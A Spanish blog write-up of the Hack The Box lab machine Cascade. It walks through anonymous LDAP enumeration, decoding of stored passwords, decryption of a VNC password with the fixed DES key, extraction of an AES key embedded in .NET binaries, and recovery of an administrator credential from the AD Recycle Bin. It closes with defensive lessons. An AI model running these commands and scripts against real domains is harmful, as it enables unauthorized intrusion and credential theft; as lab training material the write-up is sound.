---
title: "HTB: Cascade · de un volcado LDAP anónimo a Domain Admin vía la papelera de reciclaje de AD"
date: 2026-09-11
draft: false
tags: ["hackthebox", "active-directory", "windows", "escalada-privilegios", "ingenieria-inversa", "vnc"]
summary: "Un Controlador de Dominio Windows retirado de dificultad media donde un atributo LDAP no estándar filtra una credencial funcional a cualquiera sin autenticar, y el rastro que sigue a través de una configuración de VNC y una herramienta de auditoría casera termina con una cuenta de administrador equivalente eliminada pero aún viva en la papelera de reciclaje de AD."
---

## Resumen

Cascade es un Controlador de Dominio Windows retirado de dificultad media de Hack The Box, y es una buena lección de lo que pasa cuando una organización se inventa sus propias alternativas a una gestión de secretos de verdad. Cada credencial de esta cadena está técnicamente "protegida", y cada una de esas protecciones resulta ser reversible con herramientas básicas. El camino es:

1. **RPC y LDAP anónimos** recuperan la lista de usuarios del dominio, y un volcado LDAP completo y sin filtrar de atributos saca a la luz un campo a medida que nadie debería haber dejado expuesto.
2. Ese campo, `cascadeLegacyPwd`, se decodifica directamente en una contraseña funcional, sin crackeo de por medio.
3. El acceso de esa cuenta a un recurso compartido lleva a una **clave de registro de VNC exportada**, cuya contraseña está "cifrada" con una clave DES idéntica en todas las instalaciones de VNC del planeta.
4. La siguiente cuenta desbloquea un recurso compartido con una **herramienta de auditoría interna a medida**, cuya propia clave AES está a la vista dentro de sus binarios.
5. La cuenta de servicio de esa herramienta pertenece a un grupo delegado sobre la **papelera de reciclaje de AD**, y una cuenta de "administrador temporal" eliminada, pero aún en la papelera, resulta compartir contraseña con el Administrator real.

Objetivo: `10.129.60.223`, un Controlador de Dominio Windows Server 2008 R2 del dominio `cascade.local`.

## Enumeración

Escaneo completo de puertos TCP con scripts por defecto y detección de versiones:

```bash
nmap -sC -sV -p- -oN nmap-cascade.txt 10.129.60.223
```

```
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Microsoft DNS
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap          Microsoft Windows AD LDAP (Domain: cascade.local)
445/tcp  open  microsoft-ds
636/tcp  open  tcpwrapped
3268/tcp open  ldap
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (WinRM)
```

Un Controlador de Dominio, una build antigua de Server 2008 R2, sin puerto web que tocar. Como siempre, lo primero es comprobar si el acceso anónimo funciona en algún sitio antes de tocar nada más:

```bash
rpcclient -U "" -N 10.129.60.223 -c enumdomusers
```

RPC acepta la sesión nula y entrega 15 cuentas del dominio. `netexec smb 10.129.60.223 -u '' -p ''` confirma la misma autenticación nula y el nombre de dominio (`cascade.local`), y `kerbrute` verifica cada nombre de usuario contra Kerberos para confirmar que son cuentas reales y válidas.

El AS-REP Roasting contra toda la lista no da nada (`KDC_ERR_CLIENT_REVOKED`, estas cuentas simplemente no son vulnerables a eso), y la política de contraseñas no tiene bloqueo, pero un spray de usuario-como-contraseña y un par de contraseñas comunes tampoco dan nada. Callejón sin salida, por ahora, en los caminos obvios.

## Punto de entrada · un atributo heredado que nadie limpió

El volcado de RPC solo devolvió nombres de usuario, no objetos LDAP completos. Merece la pena pedirlo todo, no solo `sAMAccountName`:

```bash
ldapsearch -x -H ldap://10.129.60.223 -b "dc=cascade,dc=local" "(objectClass=user)"
```

Enterrado en el volcado completo de atributos de `r.thompson`:

```
cascadeLegacyPwd: clk0bjVldmE=
```

Eso no es un hash, los hashes no terminan en relleno `=` ni usan un alfabeto mezclado así, es Base64, una codificación reversible sin ninguna clave secreta de por medio:

```bash
echo 'clk0bjVldmE=' | base64 -d
# rY4n5eva
```

`r.thompson:rY4n5eva` funciona por SMB. Está claro que es un atributo a medida que alguien añadió al esquema, presumiblemente durante alguna migración de contraseñas pasada, y que nunca se limpió ni se bloqueó.

## De un recurso compartido a una contraseña de VNC

`r.thompson` puede leer el recurso compartido `Data`, y la mayoría de sus carpetas dan acceso denegado, salvo `IT`, que tiene una subcarpeta `Temp` por empleado. Dentro de la carpeta temporal de `s.smith`:

```
VNC Install.reg
```

Una clave de registro de TightVNC exportada, con la contraseña del servidor guardada como un blob hexadecimal:

```
"Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f
```

VNC no cifra esto con un secreto elegido por el administrador, lo ofusca con una **clave DES fija idéntica en todas las instalaciones de TightVNC/RealVNC**, pública desde hace años:

```bash
python3 -c "
from Crypto.Cipher import DES
key = bytes.fromhex('e84ad660c4721ae0')
enc = bytes.fromhex('6bcf2a4b6e5aca0f')
print(DES.new(key, DES.MODE_ECB).decrypt(enc))
"
# b'sT333ve2'
```

`s.smith:sT333ve2`.

## Una librería de cifrado casera con la clave horneada dentro

`s.smith` desbloquea otro recurso compartido más, `Audit$`, que aloja una pequeña aplicación .NET a medida (`CascAudit.exe`), su propia librería de cifrado (`CascCrypto.dll`), y la base de datos SQLite sobre la que opera:

```bash
sqlite3 Audit.db ".dump"
```

```sql
INSERT INTO Ldap VALUES(1,'ArkSvc','BQO5l5Kj9MdErXx6Q6AGOw==','cascade.local');
```

Una credencial de `ArkSvc` cifrada con AES. El nombre de la clase dentro de `CascCrypto.dll` (`AesCrypto`, con propiedades `DefaultIV`/`Keysize`) deja claro el algoritmo, la única pieza que falta es la clave y el IV, y el cifrado casero tiende a dejarlos embebidos en vez de derivarlos en tiempo de ejecución. `strings` en ASCII normal no los encuentra, .NET guarda los valores de configuración por defecto como Unicode:

```bash
strings -el CascCrypto.dll | awk 'length($0)==16'
# 1tdyjCbY1Ix49842        <- IV
strings -el CascAudit.exe | awk 'length($0)==16'
# c4scadek3y654321        <- Clave
```

```bash
python3 -c "
from Crypto.Cipher import AES
import base64
key = b'c4scadek3y654321'
iv = b'1tdyjCbY1Ix49842'
ct = base64.b64decode('BQO5l5Kj9MdErXx6Q6AGOw==')
print(AES.new(key, AES.MODE_CBC, iv).decrypt(ct))
"
# b'w3lc0meFr31nd\x03\x03\x03'
```

`ArkSvc:w3lc0meFr31nd` (el `\x03\x03\x03` final es solo relleno PKCS7).

## Escalada de privilegios · la papelera de reciclaje de AD se acuerda de todo

`ArkSvc` consigue WinRM, y `whoami /groups` muestra pertenencia a un grupo a medida llamado `AD Recycle Bin`. Los logs del recurso compartido `Audit$` ya lo habían insinuado: `ArkSvc` había, en el pasado, movido un usuario llamado `TempAdmin` a la papelera de reciclaje en vez de borrarlo sin más. Un hilo de correo encontrado junto a los ficheros de auditoría explicaba por qué existía: una cuenta temporal usada para una migración de red, que compartía contraseña con la cuenta real de Administrator en aquel momento, pensada para borrarse en cuanto terminara la migración.

"Eliminado" en Active Directory, cuando la función de papelera de reciclaje está activada, no significa desaparecido, significa movido a un contenedor `Deleted Objects` con todos sus atributos intactos durante una ventana de retención. Los permisos delegados de `ArkSvc` le permiten leer ese contenedor directamente:

```powershell
Import-Module ActiveDirectory
Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects -Properties *
```

`TempAdmin` sigue ahí, y lleva el mismo tipo de atributo encontrado en el punto de entrada:

```
cascadeLegacyPwd: YmFDVDNyMWFOMDBkbGVz
```

```bash
echo 'YmFDVDNyMWFOMDBkbGVz' | base64 -d
# baCT3r1aN00dles
```

```bash
netexec winrm 10.129.60.223 -u Administrator -p 'baCT3r1aN00dles'
# (Pwn3d!)
```

Flag de root capturada. Compromiso total del dominio.

## Lecciones

Nada en esta cadena es un fallo de software, son cinco decisiones separadas de reinventar el almacenamiento de secretos en vez de usar uno de verdad:

- **Un atributo a medida de "contraseña codificada" en AD no es un almacén de credenciales.** Si es reversible sin una clave secreta, no está protegido, punto, da igual con qué esquema de codificación se disfrace.
- **La ofuscación de contraseña integrada en VNC no ofrece ninguna confidencialidad real.** La clave es fija y pública; cualquier configuración de VNC exportada debe tratarse como una contraseña en texto plano expuesta.
- **Nunca embebas una clave criptográfica dentro de la propia aplicación que la usa.** Si la clave viaja con el binario, también viaja la capacidad de descifrar todo lo que protege.
- **La papelera de reciclaje de AD mantiene los objetos eliminados totalmente legibles durante un periodo de retención.** Una cuenta de migración "eliminada" con contraseña compartida no ha desaparecido, es una credencial viva esperando en un contenedor que la mayoría de administradores nunca mira. Purga, no te limites a borrar.
- **Nunca compartas contraseña entre una cuenta temporal y una cuenta administrativa real**, ni siquiera brevemente, y ni siquiera cuando la cuenta temporal esté pensada para durar poco.

*Los flags están parcialmente ocultos, por convención.*

---

También redacté este ejercicio como un informe de test de intrusión formal, el mismo formato que entregaría a un cliente, con resumen ejecutivo, hallazgos puntuados con CVSS y guía de remediación.

📄 [**Descargar el informe de pentest completo (PDF)**](/reports/Cascade_Pentest_Report/Cascade_Pentest_Report_ES.pdf)
